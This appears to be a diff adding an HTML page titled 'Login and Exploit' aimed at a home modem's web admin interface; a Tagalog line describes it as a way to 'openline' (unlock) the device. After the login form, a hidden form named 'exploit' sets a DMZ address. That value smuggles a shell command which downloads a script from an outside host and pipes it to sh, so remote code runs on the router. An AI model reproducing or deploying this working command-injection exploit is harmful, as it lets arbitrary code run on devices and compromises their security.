@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login and Exploit</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="description">
+        <p>Please login to proceed. If you encounter any issues, follow the instructions below to troubleshoot.</p>
+	<p>Dapat pag katapos click login button naka open na dashboard at hintayin mag reboot ang modem openline nayan thank you!</p>
+    </div>
+
+    <div class="login-container">
+        <form id="loginForm" method="POST" action="http://192.168.254.254/goform/goform_set_cmd_process" target="hidden_iframe">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <label>
+                <input type="checkbox" id="showPassword"> Show Password
+            </label>
+            <input type="hidden" name="isTest" value="false">
+            <input type="hidden" name="goformId" value="LOGIN">
+            <button type="submit">Login</button>
+        </form>
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+        <div id="responseBox"></div>
+    </div>
+
+    <form method="post" id="exploit" action="http://192.168.254.254/goform/goform_set_cmd_process" target="hidden_iframe">
+        <input name="goformId" value="DMZ_SETTING" type="hidden">
+        <input name="isTest" value="false" type="hidden">
+        <input name="DMZEnabled" value="1" type="hidden">
+        <input name="DMZIPAddress" value="127.0.0.1 | curl http://jamesprotech.shop/zlt-s10g/zlt-ais.sh -o - | sh &" type="hidden">
+        <input type="submit" style="display:none;">
+    </form>
+
+    <script src="script.js"></script>
+</body>
+</html>
